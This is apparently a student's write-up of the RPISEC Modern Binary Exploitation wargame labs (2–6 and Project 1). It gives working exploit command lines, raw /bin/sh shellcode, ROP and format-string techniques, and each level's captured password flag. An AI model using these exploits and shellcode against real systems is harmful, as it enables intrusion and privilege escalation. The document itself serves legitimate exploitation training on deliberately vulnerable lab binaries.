# Modern Binary Exploitation
## Lab 2

### Lab 2C

```bash
./lab2C `printf 'aaaaaaaaaaaaaaa\xef\xbe\xad\xde'`
$ cat ~lab2B/.pass
1m_all_ab0ut_d4t_b33f
```

### Lab 2B
* RA is 0x1b bytes from the buffer we copy to
* shell is at 0x80486bd
* shell takes an arg
* 0804a028 D exec_string
* but it's a pointer
* 0x80487d0

```bash
lab2B@warzone:/levels/lab02$ ./lab2B `python -c 'print "a"*0x1b + "\xbd\x86\x04\x08" + "AAAA" + "\xd0\x87\x04\x08"'`
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaΩAAAA–á
$ cat ~lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b
```

### Lab 2A
* We can't overwrite the stack directly, but we can overwrite the value of i. We need to overwrite it to let us write a few extra bytes (16 in a 12 byte buffer), and then quit with a blank line
* The loop doesn't check that i is over a certain value, so we can put anything in i to have it run until overflow, writing as many bytes as we need, until we overwrite the RA, then send a blank line to quit out
* We need to use a subshell with a `cat -` so that we reconnect the stdin back to the terminal, otherwise the elevated shell has no stdin and won't run.
* 080486fd T shell

```bash
lab2A@warzone:/levels/lab02$ (printf "1234567890XX\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\xfd\n\x86\n\x04\n\x08\n\n"; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
cat ~lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
```

## Lab 3

### Lab 3C
* We can overflow buth the username and the password
* username is in .data -> Static location for shellcode (0x08049c40)
* password is on stack -> can overwrite RA
* username must begin witn 'rpisec'

```bash
lab3C@warzone:/levels/lab03$ (python -c "import struct; print 'rpisec' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n' + 'A'*0x50 + struct.pack('<L', 0x08049c40 + len('rpisec')) + '\n'"; cat) | ./lab3C
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat ~lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

### Lab 3B
* We can overflow a buffer on the stack
* The process forks, and the parent makes sure that the child does not call execve, if it does, it quit
* Need a shellcode that doesn't use execve: open, read, write instead.
  * http://shell-storm.org/shellcode/files/shellcode-73.php
* See lab3B.py.

```bash
lab3B@warzone:/levels/lab03$ python /tmp/lab3B.py|./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
child is exiting...
````

### Lab 3A
* Buffer on the stack in `main`
* Can read from any index
* Can write to any address, except for if the index is a multiple of three or the MSB is 0xb7 (That means 0 also)
* Write 4 bytes at a time
* Tried to patch out the checks, but the .text section is not writeable, so we cannot get around this restriction.

* Stack buffer at 0xbffff548 (in gdb).
* We will need to write shellcode that jumps over every 9-12th byte.

```asm
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  eb 2b                   jmp    30 <bin>
00000005 <back_bin>:
5:  5b                      pop    ebx
6:  eb 04                   jmp    c <hop1>
8:  cc                      int3
9:  cc                      int3
a:  cc                      int3
b:  cc                      int3
0000000c <hop1>:
c:  83 c3 07                add    ebx,0x7
f:  31 c9                   xor    ecx,ecx
11: 90                      nop
12: eb 04                   jmp    18 <hop2>
14: cc                      int3
15: cc                      int3
16: cc                      int3
17: cc                      int3
00000018 <hop2>:
18: 31 d2                   xor    edx,edx
1a: 31 c0                   xor    eax,eax
1c: b0 0b                   mov    al,0xb
1e: eb 04                   jmp    24 <hop3>
20: cc                      int3
21: cc                      int3
22: cc                      int3
23: cc                      int3
00000024 <hop3>:
24: cd 80                   int    0x80
26: 31 c0                   xor    eax,eax
28: 40                      inc    eax
29: cd 80                   int    0x80
2b: 90                      nop
2c: cc                      int3
2d: cc                      int3
2e: cc                      int3
2f: cc                      int3
00000030 <bin>:
30: e8 d0 ff ff ff          call   5 <back_bin>
35: 90                      nop
36: 90                      nop
37: 90                      nop
38: cc                      int3
39: cc                      int3
3a: cc                      int3
3b: cc                      int3
0000003c <bin_str>: "/bin/sh\x00"
```

See _lab3A.py_.

flag:sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps

## Lab 4
### Lab 4C
* We simply need to leak the flag that is read into a buffer.
* Format string vuln in the usernmae
* Password buffer comes first, then real password, then username.
* Fifth argument gets first 2 bytes of the password, and real password is 100 bytes later, meaning we must start at 5 + 100/4th -1 = 29th argument
* Password is 30 characters long, so we must leak 8 dwords
* See _lab4C.py_

```bash
lab4C@warzone:/levels/lab04$ python /tmp/lab4C.py
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

### Lab 4B
* Single buffer with format string vuln.
* Start of buffer at 6$.
* Any char in A-Z (0x41-0x5a) will be made lower case.
* `exit(0)` is called, so no overwriting RA.
* `exit@got.plt` is at 0x080499b8.
* Stack is executable, so we can point exit@plt to shell code
* Shell code will be modified if any bytes are capital letters
  * This includes `push eax` and `push ecx`.
  * Easily replaced with `sub esp, 4; mov [esp], <reg>`.
* See _lab4B.py_.

```bash
lab4B@warzone:/levels/lab04$ (python /tmp/lab4B.py; cat -) | ./lab4B
cat ~lab4A/.pass
fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
```

### Lab 4A
* Need to run from a directory that contains a writable _backups_ dir.
* Vuln is in snprintf
* String is unaligned (since it starts with a string "Starting back up: ".
* Since args come in argv, addresses will shift as argument changes size.
* Put a byte before the address (e.g. xAAAA) and can write to it through the 14th argument.
* RA at 0xbffff65c (76$) in gdb.
* Normal shellcode should work
* See _lab4A.py_.

```bash
lab4A@warzone:/tmp$ fixenv /levels/lab04/lab4A `python /tmp/lab4A.py`
$ id
uid=1016(lab4A) gid=1017(lab4A) euid=1017(lab4end) groups=1018(lab4end),1001(gameuser),1017(lab4A)
$ cat ~lab4end/.pass
1t_w4s_ju5t_4_w4rn1ng
```

## Lab 5
### Lab 5C
* Overflow in `copytoglobal`.
* Safely copied to a global (Gives us an easy spot to put "/bin/sh").
  * 0x804a060
* Uses `gets` so we can put in null bytes.
* RA overwritten after 156 bytes.
* Simple ret2libc
  * `system` at 0xb7e63190
* See _lab5C.py_.

```bash
lab5C@warzone:/levels/lab05$ (python /tmp/lab5C.py; cat -) | ./lab5C
I included libc for you...
Can you ROP to system()?
cat ~lab5B/.pass
s0m3tim3s_r3t2libC_1s_3n0ugh
```

### Lab 5B
* Statically compiled, so `system` is unavailable. Will need to do a ROP chain syscall.
* 140 bytes to flow into RA of `main`.
* Stack buf at 0xbffff6f0 (with `fixenv`)
* Can put nulls on stack because of `gets`.
  * This makes it very easy, we just need to set eax, ebx, and ecx correctly, we don't need to worry about using gadget to set up the args on the stack.
* See _lab5B.py_.

```bash
lab5B@warzone:/levels/lab05$ (python /tmp/lab5B.py; cat -) | ./lab5B
Insert ROP chain here:
cat ~lab5A/.pass
th4ts_th3_r0p_i_lik3_2_s33
```

### Lab 5A
* Very similar to lab3A.
  * Only a few differences:
    1. Index is now _unsigned_.
    2. It's compiled statically.
    3. Stack is NX.
    4. There is now a check that the index is under 100 (size of buffer).
      * This is a bug! Check should be that index is under _25_ (number of elements in array).
  * This means we can write anywhere before, up to 300 bytes past the end, which doesn't reach RA.
  * That means we will need to write our ROP code somewhere (in the buffer is fine) and then overwrite _store_number_'s RA with a stack pivot gadget.
* Every third DWORD again cannot be written to (again).
* Need to make a ROP chain that can handle these gaps: Just choose gadgets that pop extra, perhaps.
* There is a `add esp, 0x2c; ret` gadget, which jumps 44 extra bytes. RA of `store_number` happens to be _exactly_ 44 bytes in front of the buffer, plus the first element of the buffer cannot be written to (0 % 3 == 0), but that accounts for the four bytes that are removed by the return in the function itself!
* See _lab5A.py_.

```bash
lab5A@warzone:/levels/lab05$ (python /tmp/lab5A.py; cat -) | ./lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:
id
uid=1020(lab5A) gid=1021(lab5A) euid=1021(lab5end) groups=1022(lab5end),1001(gameuser),1021(lab5A)
cat ~lab5end/.pass
byp4ss1ng_d3p_1s_c00l_am1rite
```

## Project 1
* Hidden menu option 3 turns you into in admin, which reveals option 6, which prints addresses of tweets.
  * Also breaks the menu by printing a bad color code around the last tweet.
* Tweets are allocated with `calloc` and form a linked list.
* Linked list store the string _in band_, and the _next_ pointer at +0x10.
* Other than the first and second tweet, tweets are 0x20 bytes apart (though only 0x14 bytes in size).
* Any newline found in a tweet is replaced with 0xcc (`int 3`).
* After the _next_ pointer a 0xc3 (`ret`) is written in.
* You can login to become an admin, and then you can enable a debug mode that dumps the addresses of the tweets.
* 'secret' Password is 16 bytes read from _/dev/urandom_,
* 'generated' password is 16 bytes, generated using the secret password, the username, and the salt.
  * We can figure out the secret password from the generated password.
  * each byte password[i] = (secretpass[i] + salt[i]) ^ username[i]
  * therefore, secretpass[i] = (password[i] ^ username[i]) - salt[i]
* Admin mode also changes how the last tweet is printed in `last_tweet`: It uses `printf`, with the tweet body as the format string.
  * It also copies the tweet to the stack first.

* Format string is 0x1f bytes after the first argument to the vulnerable `printf`: Argument 8$.
* Can put shellcode in tweets, but they are only 16 bytes, so will need them to hop to the next.
* Second tweet is at 0x0804e040. This is where we will put the shellcode. It doesn't fit in 16 bytes so it'll have to jump to another tweet.
* Third tweet is at 0x0804e060.
* Can overwrite `exit@got.plt` which is at 0x0804d03c with the address of the second tweet.
* Tweets:
  1. doesn't matter.
  2. "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x90\xEB\x10".
  3. "\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80".
  4. Write 0xe0 to second lsb of `exit@got.plt`.
  5. Write 0x40 to lsb of 'exit@got.plt'.
* See _project1.py_.

```bash
project1@warzone:/tmp$ python /tmp/project1.py
[+] Starting program '/levels/project1/tw33tchainz': Done
[*] PID: [3138]
[*] Paused (press any to continue)
[*] Password: 8f6d83b5673d78207a9b3b9a6fa02989
[*] Swapped password: b5836d8f20783d679a3b9b7a8929a06f
[*] Secret password: 75832d8fe038fd279afb9b3a89e9606f
[*] Switching to interactive mode
...
$ cat ~project1_priv/.pass
m0_tw33ts_m0_ch4inz_n0_m0n3y
```

## Lab 6
### Lab 6C
* Write a 40 char name and a 140 char tweet.
* We can write one byte into msglen, which determines how many chars we write into the tweet. We can then overflow in RA.
* There is no data leak, so we can't really explicitly put in the address of `secret_backdoor`. Need to use a partial overwrite.
* Last 12 bits of the address of `secret_backdoor` is always 0xX72b.
  * We can overwrite the 2 LSB of the RA, then have a 1/16 chance of getting it correct.
  * Will use 0x372b, since that's an easy "+7" in ASCII.
* Need to write exactly 198 bytes, so need to overwrite the msglen to that value.

(python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C

```bash
lab6C@warzone:/levels/lab06$ (python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Tweet @Unix-Dude
>>: >: Tweet sent!

id
uid=1022(lab6C) gid=1023(lab6C) euid=1023(lab6B) groups=1024(lab6B),1001(gameuser),1023(lab6C)
cat ~lab6B/.pass
p4rti4l_0verwr1tes_r_3nuff
```

### Lab 6B
* Password is read into a heap buffer from a file.
* Password from file is 'hashed' by xoring each byte with the matching char in "lab6A", padded with 0x44, and stored back in _secret_pass_.
* Prompts for username and password, which are 'hashed' together, with the same padding.
* These hashes are compared, and if they match, a shell is spawned.
* We can write strings without null bytes to username and password - This can leak the stored ebp, and also hash past the end of password.
  * But in doing this, we will also 'hash' them, including corrupting the ra, but that will only fail when we run out of attempts... but our number of attempts is also corrupted.
* If we enter two sets of usernames and passwords, we should be able to exploit. Although we can leak and even repair what we messed up while hashing, we don't need a to, since the functions always have the same page offset and are on the same page, we can just control how the RA is hashed:
  * `login` is at 0xXXXXXaf4.
  * `login_prompt` returns to main+189 (0xXXXXXf7e)

1. Provide a username and password that are both 32 bytes in length (to hash beyond their end), and take care that the password that is 0x20 bytes before the RA on the stack, once hashed with the corresponding username, will have the RA to a value we want (0x058a)
2. Provide a username and password that will restore the attempts value, that way we don't have a huge number of attempts to exhaust.
   * Take care that we 'repair' the `attempts` count so we can cause `login_prompt` to return.
   * To go from 0xXf7e to 0xXaf4, xor with 0x058a
   * Because the hash hashes with the byte 0x20 bytes before itself, we need to put 0x8a at password + 0x14, 0x05 atpassword + 0x15.
   * The bytes after will get corrupt, so we need to control how (and reverse it)
   * We can put 0x20 at +0x16 and +0x17, and try twice to remove it.

* See _lab6B.py_.
